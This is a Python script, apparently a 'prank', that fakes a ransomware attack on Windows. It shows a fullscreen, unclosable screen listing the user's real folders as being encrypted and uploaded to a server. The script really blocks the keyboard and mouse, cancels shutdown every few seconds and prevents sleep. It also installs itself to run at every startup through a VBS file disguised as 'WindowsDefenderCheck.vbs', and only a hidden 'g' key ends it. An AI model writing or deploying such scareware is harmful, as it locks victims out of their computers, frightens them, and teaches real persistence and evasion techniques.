import sys
import subprocess
import os
import random
import time
import threading
import ctypes

# ── Auto-install des dépendances ──────────────────────────────────────────────
def _ensure():
    missing = []
    for pkg in ("keyboard", "pynput"):
        try:
            __import__(pkg)
        except ImportError:
            missing.append(pkg)
    if missing:
        subprocess.check_call(
            [sys.executable, "-m", "pip", "install", *missing],
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
        )

_ensure()

import keyboard                       # noqa: E402
import tkinter as tk                  # noqa: E402
from pynput import mouse as _pmouse   # noqa: E402

# ── Collecte les vrais chemins du PC ─────────────────────────────────────────
def _collect():
    home = os.path.expanduser("~")
    folders = {}
    for name in ("Documents", "Desktop", "Downloads", "Pictures",
                 "Videos", "Music", "AppData", "OneDrive"):
        d = os.path.join(home, name)
        if os.path.exists(d):
            items = [d]
            try:
                for f in sorted(os.listdir(d))[:15]:
                    items.append(os.path.join(d, f))
            except OSError:
                pass
            folders[name] = items
    extra = [
        r"C:\Windows\System32\config",
        r"C:\Windows\System32\drivers",
        r"C:\Windows\SysWOW64",
        r"C:\Program Files",
        r"C:\Program Files (x86)",
        r"C:\ProgramData\Microsoft",
        r"C:\Users\Public\Documents",
        r"C:\Windows\Temp",
    ]
    return folders, extra

FOLDERS, EXTRA = _collect()
FLAT = []
for _paths in FOLDERS.values():
    FLAT.extend(_paths)
FLAT.extend(EXTRA)
random.shuffle(FLAT)

# ── Bloquer veille / shutdown / redémarrage ───────────────────────────────────
def _prevent_power():
    try:
        ES = 0x80000000 | 0x00000001 | 0x00000002  # CONTINUOUS | SYSTEM | DISPLAY
        ctypes.windll.kernel32.SetThreadExecutionState(ES)
    except Exception:
        pass
    while True:
        try:
            subprocess.Popen("shutdown /a", shell=True,
                             stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        except Exception:
            pass
        time.sleep(5)

threading.Thread(target=_prevent_power, daemon=True).start()

# ── Blocage clavier ───────────────────────────────────────────────────────────
def _block_keys():
    for combo in [
        "windows", "left windows", "right windows",
        "alt+f4", "alt+tab", "alt+shift+tab",
        "ctrl+esc", "ctrl+shift+esc",
        "windows+d", "windows+e", "windows+r", "windows+l",
        "windows+tab", "windows+m", "windows+shift+m",
        "windows+left", "windows+right", "windows+up", "windows+down",
        "ctrl+windows+left", "ctrl+windows+right",
        "ctrl+windows+d", "ctrl+windows+f4",
    ]:
        try:
            keyboard.add_hotkey(combo, lambda: None, suppress=True)
        except Exception:
            pass

threading.Thread(target=_block_keys, daemon=True).start()

# ── Persistence au démarrage ──────────────────────────────────────────────────
def _install_startup():
    try:
        startup = os.path.join(
            os.environ.get("APPDATA", ""),
            "Microsoft", "Windows", "Start Menu", "Programs", "Startup",
        )
        if not os.path.isdir(startup):
            return
        script  = os.path.abspath(__file__)
        pythonw = sys.executable.replace("python.exe", "pythonw.exe")
        vbs     = os.path.join(startup, "WindowsDefenderCheck.vbs")
        with open(vbs, "w") as f:
            f.write(
                'Set s = CreateObject("WScript.Shell")\r\n'
                f's.Run Chr(34) & "{pythonw}" & Chr(34) & " " '
                f'& Chr(34) & "{script}" & Chr(34), 0, False\r\n'
            )
    except Exception:
        pass

threading.Thread(target=_install_startup, daemon=True).start()

# ── Blocage souris ────────────────────────────────────────────────────────────
_mouse_listener = None

def _block_mouse():
    global _mouse_listener
    _mouse_listener = _pmouse.Listener(suppress=True)
    _mouse_listener.start()
    _mouse_listener.join()

def _hide_cursor_loop():
    try:
        while True:
            ctypes.windll.user32.ShowCursor(False)
            time.sleep(0.1)
    except Exception:
        pass

threading.Thread(target=_block_mouse,      daemon=True).start()
threading.Thread(target=_hide_cursor_loop, daemon=True).start()

# ── Fausse CMD ────────────────────────────────────────────────────────────────
for _ in range(2):
    subprocess.Popen("start cmd /k echo prank freind hhh", shell=True)
time.sleep(2)
subprocess.Popen("taskkill /F /IM cmd.exe", shell=True)

# ── Couleurs ──────────────────────────────────────────────────────────────────
BG, RED, DRED   = "#0a0a0a", "#ff0000", "#cc0000"
GREEN, YELLOW   = "#00ff00", "#ffff00"
ORANGE, WHITE   = "#ff8800", "#ffffff"
GRAY            = "#1a1a1a"

# ── Root window ───────────────────────────────────────────────────────────────
root = tk.Tk()
root.attributes("-fullscreen", True)
root.attributes("-topmost",    True)
root.configure(bg=BG, cursor="none")
root.protocol("WM_DELETE_WINDOW", lambda: None)

SW = root.winfo_screenwidth()
SH = root.winfo_screenheight()

# ── Header avec icônes clignotantes ──────────────────────────────────────────
hdr = tk.Frame(root, bg=BG)
hdr.pack(fill="x", pady=(18, 2))

alert_l = tk.Label(hdr, text="[!] [!] [!]", fg=RED, bg=BG,
                   font=("Consolas", 16, "bold"))
alert_l.pack(side="left", padx=24)

header = tk.Label(hdr, text="[!!] SYSTEM COMPROMISED [!!]",
                  fg=RED, bg=BG, font=("Consolas", 22, "bold"))
header.pack(side="left", expand=True)

alert_r = tk.Label(hdr, text="[!] [!] [!]", fg=RED, bg=BG,
                   font=("Consolas", 16, "bold"))
alert_r.pack(side="right", padx=24)

sub = tk.Label(root,
               text="Your files are being encrypted. Do NOT turn off your computer.",
               fg="#ff4444", bg=BG, font=("Consolas", 11))
sub.pack(pady=(0, 8))

# ── Corps principal ───────────────────────────────────────────────────────────
body = tk.Frame(root, bg=BG)
body.pack(fill="both", expand=True, padx=36)

# Gauche : log des fichiers attaqués
log_text = tk.Text(body, bg=BG, fg=GREEN, font=("Consolas", 9),
                   state="disabled", borderwidth=0, highlightthickness=0,
                   cursor="none", selectbackground=BG, width=72)
log_text.pack(side="left", fill="both", expand=True)
for tag, color in (("g", GREEN), ("y", YELLOW), ("o", ORANGE), ("r", RED)):
    log_text.tag_config(tag, foreground=color)

# Séparateur
tk.Frame(body, bg="#222222", width=2).pack(side="left", fill="y", padx=6)

# Droite : cloud upload par dossier
right = tk.Frame(body, bg=BG, width=320)
right.pack(side="right", fill="y")
right.pack_propagate(False)

tk.Label(right, text="  CLOUD UPLOAD STATUS", fg=YELLOW, bg=BG,
         font=("Consolas", 10, "bold")).pack(anchor="w", pady=(8, 10))

_cloud_widgets = {}   # fname -> (bar_fill, bar_bg, pct_lbl, size_lbl)
_folder_mb     = {k: [0.0] for k in FOLDERS}

for fname in FOLDERS:
    row = tk.Frame(right, bg=BG)
    row.pack(fill="x", pady=2, padx=6)

    tk.Label(row, text=f"{fname[:11]:<11}", fg="#aaaaaa", bg=BG,
             font=("Consolas", 8), anchor="w").pack(side="left")

    col = tk.Frame(row, bg=BG)
    col.pack(side="left", fill="x", expand=True)

    bar_bg = tk.Frame(col, bg=GRAY, height=12)
    bar_bg.pack(fill="x")
    bar_bg.pack_propagate(False)
    bar_fill = tk.Frame(bar_bg, bg=DRED, height=12)
    bar_fill.place(x=0, y=0, relheight=1, width=0)

    info = tk.Frame(col, bg=BG)
    info.pack(fill="x")
    pct_l  = tk.Label(info, text="0%",      fg=RED,      bg=BG, font=("Consolas", 7))
    pct_l.pack(side="left")
    size_l = tk.Label(info, text="0.0 MB↑", fg="#666666", bg=BG, font=("Consolas", 7))
    size_l.pack(side="right")

    _cloud_widgets[fname] = (bar_fill, bar_bg, pct_l, size_l)

tk.Frame(right, bg="#333333", height=1).pack(fill="x", padx=6, pady=8)
total_lbl  = tk.Label(right, text="Uploaded: 0.0 MB", fg=YELLOW, bg=BG,
                      font=("Consolas", 9, "bold"))
total_lbl.pack(anchor="w", padx=6)
server_lbl = tk.Label(right, text="Server: 185.220.101.42:4444",
                      fg="#444444", bg=BG, font=("Consolas", 8))
server_lbl.pack(anchor="w", padx=6, pady=(2, 0))

# ── Barre de stats ────────────────────────────────────────────────────────────
sf = tk.Frame(root, bg=BG)
sf.pack(fill="x", padx=36, pady=(6, 0))
files_lbl = tk.Label(sf, text="Files encrypted: 0",  fg=ORANGE, bg=BG, font=("Consolas", 10))
files_lbl.pack(side="left")
size_lbl  = tk.Label(sf, text="Data stolen: 0.0 MB", fg=ORANGE, bg=BG, font=("Consolas", 10))
size_lbl.pack(side="right")

# ── Barre de progression globale ─────────────────────────────────────────────
prog_bg = tk.Frame(root, bg=GRAY, height=16)
prog_bg.pack(fill="x", padx=36, pady=(5, 2))
prog_bg.pack_propagate(False)
prog_fill = tk.Frame(prog_bg, bg=DRED, height=16)
prog_fill.place(x=0, y=0, relheight=1, width=0)

pct_lbl = tk.Label(root, text="0%  initializing attack...",
                   fg=WHITE, bg=BG, font=("Consolas", 11, "bold"))
pct_lbl.pack(pady=(2, 14))

# ── Troll face popups (thread-safe via root.after) ────────────────────────────
FACES = [
    "( ͡° ͜ʖ ͡°)\n  PROBLEM?",
    "ಠ_ಠ\n  U MAD BRO?",
    "(▀̿Ĺ̯▀̿ ̿)\n   GG EZ",
    "¯\\_(ツ)_/¯\n   RIP DATA",
    "ʕ•ᴥ•ʔ\n  HA HA HA",
    ">:D\n BYE BYE FILES",
    "(⌐■_■)\n  HACKED",
    "ಥ_ಥ\n  TOO LATE",
]

def _make_troll():
    try:
        top = tk.Toplevel(root)
        top.overrideredirect(True)
        top.attributes("-topmost", True)
        top.configure(bg="#0d0000", cursor="none")
        w, h = 210, 110
        x = random.randint(0, max(SW - w, 1))
        y = random.randint(0, max(SH - h, 1))
        top.geometry(f"{w}x{h}+{x}+{y}")
        border = tk.Frame(top, bg=RED, padx=2, pady=2)
        border.pack(fill="both", expand=True)
        inner = tk.Frame(border, bg="#0d0000")
        inner.pack(fill="both", expand=True)
        tk.Label(inner, text=random.choice(FACES), fg=RED, bg="#0d0000",
                 font=("Consolas", 13, "bold"), justify="center").pack(expand=True)
        top.after(random.randint(3000, 6000), top.destroy)
    except Exception:
        pass

def _troll_loop():
    while True:
        time.sleep(random.uniform(4, 9))
        try:
            root.after(0, _make_troll)
        except Exception:
            break

threading.Thread(target=_troll_loop, daemon=True).start()

# ── Blink icônes d'alerte ─────────────────────────────────────────────────────
def _blink():
    _v = [True]
    def _toggle():
        c = RED if _v[0] else BG
        try:
            alert_l.config(fg=c)
            alert_r.config(fg=c)
        except Exception:
            return
        _v[0] = not _v[0]
        root.after(480, _toggle)
    root.after(480, _toggle)

root.after(100, _blink)

# ── Animation principale ──────────────────────────────────────────────────────
_files = [0]
_mb    = [0.0]

ACTIONS = {
    "ENCRYPTING": "g",
    "STEALING  ": "y",
    "CORRUPTING": "o",
    "DELETING  ": "r",
}
PHASES = [
    "initializing attack...", "bypassing antivirus...",
    "encrypting files...",    "stealing credentials...",
    "uploading to server...", "overwriting backups...",
    "finalizing...",
]
FNAMES = list(FOLDERS.keys()) or ["Documents"]

def _log_line(path, action, size):
    log_text.configure(state="normal")
    log_text.insert("end", f"[{action}]  {path}  ({size:.1f} MB)\n", ACTIONS[action])
    log_text.see("end")
    log_text.configure(state="disabled")

def _update_cloud():
    total = 0.0
    for fname, (bar_fill, bar_bg, pct_l, size_l) in _cloud_widgets.items():
        mb  = _folder_mb[fname][0]
        total += mb
        bw  = bar_bg.winfo_width()
        cap = max(len(FOLDERS.get(fname, [])) * 35.0, 1.0)
        pct = min(int(mb / cap * 100), 100)
        bar_fill.place(x=0, y=0, relheight=1, width=int(bw * pct / 100))
        pct_l.config(text=f"{pct}%",      fg=GREEN if pct >= 100 else RED)
        size_l.config(text=f"{mb:.0f} MB↑", fg=GREEN if pct >= 100 else "#666666")
    label = (f"{total/1024:.2f} GB" if total >= 1024 else f"{total:.0f} MB")
    total_lbl.config(text=f"Uploaded: {label}")

def _run():
    bar_w = SW - 72
    idx   = 0
    for pct in range(101):
        for _ in range(random.randint(3, 7)):
            if idx < len(FLAT):
                action = random.choice(list(ACTIONS))
                size   = round(random.uniform(0.5, 150.0), 1)
                _log_line(FLAT[idx], action, size)
                _files[0] += 1
                _mb[0]    += size
                fname = random.choice(FNAMES)
                _folder_mb[fname][0] += size
                idx += 1

        files_lbl.config(text=f"Files encrypted: {_files[0]:,}")
        size_lbl.config(text=f"Data stolen: {_mb[0]:.0f} MB")
        phase = PHASES[min(pct * len(PHASES) // 101, len(PHASES) - 1)]
        pct_lbl.config(text=f"{pct}%  {phase}")
        prog_fill.place(x=0, y=0, relheight=1, width=int(bar_w * pct / 100))
        _update_cloud()

        if pct in (20, 40, 60, 80):
            header.config(fg=WHITE); root.update(); time.sleep(0.05)
            header.config(fg=RED)

        root.update()
        time.sleep(0.07)

    header.config(text="[!!] ENCRYPTION COMPLETE [!!]")
    sub.config(text="All your files have been encrypted and uploaded to our servers.")
    pct_lbl.config(text="100%  DONE", fg=RED)

# ── Sortie ────────────────────────────────────────────────────────────────────
def _exit(_=None):
    if _mouse_listener:
        _mouse_listener.stop()
    keyboard.unhook_all()
    try:
        ctypes.windll.user32.ShowCursor(True)
    except Exception:
        pass
    root.destroy()

root.after(400, lambda: threading.Thread(target=_run, daemon=True).start())
root.bind("<g>", _exit)
root.mainloop()